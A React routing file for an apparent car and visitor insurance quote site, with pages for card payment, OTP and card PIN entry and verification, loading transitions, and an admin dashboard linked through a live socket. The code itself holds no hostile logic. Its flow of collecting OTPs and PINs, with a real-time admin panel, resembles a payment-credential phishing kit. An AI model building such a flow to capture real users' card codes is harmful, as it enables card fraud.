import { BrowserRouter as Router, Routes, Route } from 'react-router-dom';
import { SocketProvider } from './context/SocketContext';
import Home from './pages/public/Home';
import CarDetails from './pages/insurance-flow/CarDetails';
import MoreDetails from './pages/insurance-flow/MoreDetails';
import LoadingScreen from './pages/public/LoadingScreen';
import SelectInsurance from './pages/insurance-flow/SelectInsurance';
import PlateNumber from './pages/insurance-flow/PlateNumber';
import InsuranceInfo from './pages/insurance-flow/InsuranceInfo';
import PolicyDate from './pages/insurance-flow/PolicyDate';
import Quote from './pages/insurance-flow/Quote';
import PayDCC from './pages/payment/PayDCC';
import PayQPay from './pages/payment/PayQPay';
import PaymentPending from './pages/payment/PaymentPending';
import PaymentOTP from './pages/payment/PaymentOTP';
import OTPVerification from './pages/public/OTPVerification';
import PaymentPIN from './pages/payment/PaymentPIN';
import PINVerification from './pages/public/PINVerification';
import PaymentSuccess from './pages/payment/PaymentSuccess';
import PaymentFailed from './pages/payment/PaymentFailed';
import LoadingToPayment from './pages/public/LoadingToPayment';
import AdminLogin from './pages/admin/AdminLogin';
import Dashboard from './pages/admin/Dashboard';
import LoadingTransition from './pages/public/LoadingTransition';
import ProtectedRoute from './components/features/insurance/ProtectedRoute';
import VisitorsInsurance from './pages/insurance-flow/VisitorsInsurance';
import VisitorsQuote from './pages/insurance-flow/VisitorsQuote';
import HolderInfo from './pages/insurance-flow/HolderInfo';
import DemoPage from './pages/public/DemoPage';
import './index.css';

// Import CSS Modules global variables
import './styles/modules/variables.module.css';
import './styles/modules/animations.module.css';

function App() {
  return (
    <Router 
      future={{ 
        v7_startTransition: true,
        v7_relativeSplatPath: true 
      }}
    >
      <SocketProvider>
        <Routes>
          {/* Public Landing Page */}
          <Route path="/" element={<Home />} />
          
          {/* CSS Modules Demo Page */}
          <Route path="/demo" element={<DemoPage />} />
          
          {/* Visitors Health Insurance */}
          <Route path="/visitors" element={<VisitorsInsurance />} />
          <Route path="/visitors/quote" element={<VisitorsQuote />} />
          <Route path="/visitors/holder-info" element={<HolderInfo />} />
          
          {/* Car Insurance Flow */}
          <Route path="/car-details" element={<CarDetails />} />
          <Route path="/more-details" element={<MoreDetails />} />
          <Route path="/loading" element={<LoadingScreen />} />
          <Route path="/select-insurance" element={<SelectInsurance />} />
          <Route path="/quote" element={<SelectInsurance />} />
          <Route path="/plate-number" element={<PlateNumber />} />
          <Route path="/loading-to-info" element={<LoadingTransition nextRoute="/info-insurance" />} />
          <Route path="/info-insurance" element={<InsuranceInfo />} />
          <Route path="/loading-to-policy" element={<LoadingTransition nextRoute="/policy-date" />} />
          <Route path="/policy-date" element={<PolicyDate />} />
          <Route path="/loading-to-quote" element={<LoadingTransition nextRoute="/quotecheaK" />} />
          <Route path="/quotecheaK" element={<Quote />} />
          <Route path="/loading-to-paydcc" element={<LoadingToPayment nextRoute="/paydcc" />} />
          <Route path="/loading-to-payqpay" element={<LoadingToPayment nextRoute="/payqpay" />} />
          <Route path="/paydcc" element={<PayDCC />} />
          <Route path="/payqpay" element={<PayQPay />} />
          <Route path="/payment-pending" element={<PaymentPending />} />
          <Route path="/payment-otp" element={<PaymentOTP />} />
          <Route path="/otp-verification" element={<OTPVerification />} />
          <Route path="/payment-pin" element={<PaymentPIN />} />
          <Route path="/pin-verification" element={<PINVerification />} />
          <Route path="/payment-success" element={<PaymentSuccess />} />
          <Route path="/payment-failed" element={<PaymentFailed />} />
          
          {/* Admin Login */}
          <Route path="/admin/login" element={<AdminLogin />} />
          
          {/* Protected Admin Dashboard Route */}
          <Route path="/admin" element={<ProtectedRoute><Dashboard /></ProtectedRoute>} />
        </Routes>
      </SocketProvider>
    </Router>
  );
}

export default App;
